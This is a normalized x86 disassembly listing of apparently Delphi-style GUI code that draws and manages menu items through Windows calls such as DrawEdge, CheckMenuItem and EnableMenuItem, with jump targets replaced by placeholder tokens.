push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4248b4
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_42453c
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_456224
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_4248b4
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_4242ac
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_4237e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403290
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_458f20
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a387
lea eax [ ebp - 0x4 ]
call sub_404008
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_457fe4
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_424714
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_458f20
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_45a4d4
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_45aeb8
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_45a504
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_45a550
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_45a732
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_40348c
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_45a504
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_45aeb8
mov esi eax
mov eax edi
call sub_45a4d4
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_404414
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402ca4
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_4040a0
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_457fe4
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404314
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45a739
lea eax [ ebp - 0x24 ]
call sub_404008
lea eax [ ebp - 0x10 ]
call sub_404008
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_458f20
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_45a764
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_404414
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_40405c
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_45a78c
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45a8fc
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_45a90c
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_45a7d4
sub_45a7d4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_458e90
push eax
call CheckMenuItem
mov eax esi
call sub_45a78c
sub_45a828
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_45a8fc
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
jmp r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
test [ esi + 0x1c ] 0x2
jne r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_458e90
push eax
call EnableMenuItem
sub_45a8a0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x3f ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov [ esi + 0x3f ] bl
cmp [ esi + 0x38 ] 0x0
je r-xdata
mov edx esi
mov eax edi
call sub_45ac60
mov edx eax
mov ecx ebx
mov eax edi
call sub_458e30
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov eax esi
call sub_45a78c
sub_45a90c
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_418310
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_457f38
sub_45a97c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_45a8fc
test esi esi
jge r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax ebx
call sub_45a964
cmp esi eax
je r-xdata
mov esi eax
dec esi
mov edi [ ebx + 0x64 ]
mov edx ebx
mov eax edi
call sub_45ac94
mov ecx ebx
mov edx esi
mov eax edi
call sub_45aa88
sub_45a9c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45a8fc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45a90c
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
inc esi
dec ebx
jne r-xdata
sub_45aa1c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov ebp eax
cmp bl [ ebp + 0x3a ]
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov [ ebp + 0x3a ] bl
mov dl 0x1
mov eax ebp
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebp + 0x64 ] 0x0
je r-xdata
mov eax [ ebp + 0x64 ]
call sub_45a8fc
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_45a90c
mov [ eax + 0x3a ] 0x0
mov edx esi
mov eax [ ebp + 0x64 ]
call sub_45a90c
cmp [ eax + 0x3a ] 0x0
je r-xdata
sub_45aa88
push ebx
push esi
push edi
push ebp
mov esi ecx
mov edi edx
mov ebx eax
cmp [ esi + 0x64 ] 0x0
je r-xdata
cmp [ ebx + 0x5c ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_457f38
mov ebp edi
dec ebp
test ebp ebp
jl r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403260
mov [ ebx + 0x5c ] eax
mov cl [ esi + 0x3f ]
mov edx edi
mov eax ebx
call sub_458e30
mov ecx esi
mov edx edi
mov eax [ ebx + 0x5c ]
call sub_41838c
mov [ esi + 0x64 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x80 ] sub_45ad00
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax [ ebx + 0x5c ]
cmp ebp [ eax + 0x8 ]
jge r-xdata
mov eax ebx
call sub_45a8fc
dec eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_458d60
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_418310
mov al [ eax + 0x3f ]
cmp al [ esi + 0x3f ]
jbe r-xdata
mov edx ebp
mov eax [ ebx + 0x5c ]
call sub_418310
mov dl [ eax + 0x3f ]
mov eax esi
call sub_45a8a0
sub_45ab3c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_457f38
cmp [ ebx + 0x5c ] 0x0
je r-xdata
mov eax ebx
call sub_45a8fc
test eax eax
sete dl
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_458d60
mov eax ebx
call sub_45a8fc
cmp esi eax
jl r-xdata
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_418310
mov edi eax
mov edx esi
mov eax [ ebx + 0x5c ]
call sub_418200
xor eax eax
mov [ edi + 0x64 ] eax
xor eax eax
mov [ edi + 0x80 ] eax
mov [ edi + 0x84 ] eax
cmp [ ebx + 0x34 ] 0x0
je r-xdata
sub_45abb0
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x39 ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
jne r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x78 ]
test al al
jne r-xdata
mov dl [ ebx + 0x38 ]
xor dl 0x1
mov eax ebx
call sub_45a7d4
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_45a8e4
test eax eax
je r-xdata
cmp [ ebx + 0xa8 ] 0x0
je r-xdata
cmp [ ebx + 0x8a ] 0x0
je r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov eax ebx
call sub_45a8e4
mov eax [ eax + 0x40 ]
cmp eax [ ebx + 0x88 ]
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
mov edx ebx
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
jmp r-xdata
mov edx ebx
mov eax [ ebx + 0x8c ]
call [ ebx + 0x88 ]
jmp r-xdata
sub_45ac78
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_45a8fc
mov edx eax
mov ecx esi
mov eax ebx
call sub_45aa88
pop esi
pop ebx
retn
sub_45ac94
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_45ac60
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov edx esi
mov eax ebx
call sub_45ab3c
pop esi
pop ebx
retn
mov eax [ rw-data ]
call sub_457f38
sub_45acbc
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x64 ] 0x0
jne r-xdata
mov eax esi
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop esi
pop ebx
retn
push ebx
mov ecx eax
mov edx esi
mov eax [ esi + 0x84 ]
call [ esi + 0x80 ]
xor eax eax
jmp r-xdata
cmp [ esi + 0x82 ] 0x0
je r-xdata
sub_45ad00
push ebp
mov ebp esp
push ebx
push esi
mov esi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
cmp [ ebx + 0x34 ] 0x0
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
push 0x0
mov ecx esi
mov edx ebx
call sub_45ad00
jmp r-xdata
mov eax ebx
call sub_458d60
cmp [ ebx + 0x6c ] 0x0
je r-xdata
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
call sub_45c9d8
sub_45ad58
push ebx
mov ebx eax
cmp [ ebx + 0x4c ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ ebx + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x3c ]
mov eax [ ebx + 0x4c ]
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_426fac
mov [ ebx + 0x4c ] eax
sub_45ad80
push ebx
push esi
push edi
mov edi edx
mov ebx eax
test edi edi
jne r-xdata
cmp [ ebx + 0x44 ] 0x0
jne r-xdata
mov eax [ ebx + 0x44 ]
call sub_403290
xor eax eax
mov [ ebx + 0x44 ] eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x44 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov eax [ ebx + 0x44 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_45b014
test [ edi + 0x1c ] 0x1
setne cl
mov edx edi
mov eax ebx
mov si 0xffef
call sub_40348c
mov edx ebx
mov eax edi
call sub_4207e4
mov eax ebx
mov si 0xffee
call sub_40348c
mov ecx ebx
mov dl 0x1
call [ eax + 0x14 ]
mov [ ebx + 0x44 ] eax
pop edi
pop esi
pop ebx
retn
sub_45adf0
push ebx
push esi
mov ebx edx
mov esi eax
cmp [ esi + 0x4c ] 0x0
jne r-xdata
mov edx ebx
mov eax [ esi + 0x4c ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x3c ]
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_426fac
mov [ esi + 0x4c ] eax
sub_45ae24
push ebx
push esi
push edi
mov edi eax
mov eax edi
call sub_45a8fc
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_45a90c
mov edx [ eax ]
call [ edx + 0x40 ]
inc esi
dec ebx
jne r-xdata
sub_45ae64
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x64 ]
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_45ac94
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov eax [ esi + 0x34 ]
mov edx ebx
call sub_45ac78
jmp r-xdata
mov edx ebx
mov eax esi
call sub_45ac78
sub_45aec8
push ebx
mov ebx eax
cmp dl [ ebx + 0x3d ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x3d ] dl
cmp [ ebx + 0x38 ] 0x0
je r-xdata
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
cmp [ ebx + 0x3d ] 0x0
je r-xdata
mov eax ebx
call sub_45a78c
sub_45aef4
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov eax edi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov al [ edi + 0x95 ]
mov [ esi + 0xa8 ] al
cmp [ esi + 0xa8 ] 0x0
jne r-xdata
mov edx [ edi + 0x64 ]
mov eax esi
call sub_45a764
cmp [ esi + 0x30 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x69 ]
mov eax esi
call sub_45a7d4
cmp [ esi + 0x38 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x6a ]
mov eax esi
call sub_45a828
cmp [ esi + 0x39 ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x74 ]
mov [ esi + 0x54 ] eax
cmp [ esi + 0x54 ] 0x0
jne r-xdata
test bl bl
je r-xdata
lea eax [ esi + 0x58 ]
mov edx [ edi + 0x7c ]
call sub_40405c
cmp [ esi + 0x58 ] 0x0
jne r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
mov edx [ edi + 0x80 ]
mov eax esi
call sub_45a954
cmp [ esi + 0x40 ] 0xffffffff
jne r-xdata
mov dl [ edi + 0x6c ]
mov eax esi
call sub_45a8a0
cmp [ esi + 0x3f ] 0x0
jne r-xdata
mov dx [ edi + 0x84 ]
mov eax esi
call sub_45a930
cmp [ esi + 0x60 ] 0x0
jne r-xdata
test bl bl
je r-xdata
mov dl [ edi + 0x86 ]
mov eax esi
call sub_45a944
cmp [ esi + 0x3e ] 0x1
jne r-xdata
test bl bl
je r-xdata
mov eax [ edi + 0x40 ]
mov [ esi + 0x88 ] eax
mov eax [ edi + 0x44 ]
mov [ esi + 0x8c ] eax
cmp [ esi + 0x8a ] 0x0
jne r-xdata
test bl bl
je r-xdata
sub_45b014
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_45a8e4
cmp edi eax
jne r-xdata
pop edi
pop esi
retn
xor ecx ecx
mov edx edi
mov eax esi
mov si 0xffef
call sub_40348c
sub_45b038
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x20 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45b058
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x24 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45b078
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x28 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45b098
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x38 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45b0b8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45b0d8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x3c ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45b0f8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x40 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45b118
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x44 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45b138
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x44 ]
test esi esi
je r-xdata
mov al 0x1
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0x8 ]
test al al
je r-xdata
xor eax eax
pop esi
pop ebx
retn
sub_45b158
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_40341c
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4189f0
mov dl [ ebx + 0x39 ]
mov edi esi
mov eax edi
call sub_455460
mov edx [ ebx + 0x54 ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov edx [ ebx + 0x58 ]
mov eax edi
call sub_455598
mov edx [ ebx + 0x40 ]
mov eax edi
call sub_4555f8
mov edx [ ebx + 0x30 ]
mov eax edi
call sub_4552f8
mov dl [ ebx + 0x3e ]
mov eax edi
call sub_4556b8
push [ ebx + 0x8c ]
push [ ebx + 0x88 ]
mov eax edi
mov edx [ eax ]
call [ edx + 0x34 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_45b1d0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_420a30
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_45a8e4
cmp edi eax
jne r-xdata
cmp edi [ esi + 0x7c ]
jne r-xdata
xor edx edx
mov eax esi
call sub_45ad80
jmp r-xdata
cmp edi [ esi + 0x68 ]
jne r-xdata
xor edx edx
mov eax esi
call sub_45b224
jmp r-xdata
xor edx edx
mov eax esi
call sub_458ce8
sub_45b224
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x7c ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x7c ] eax
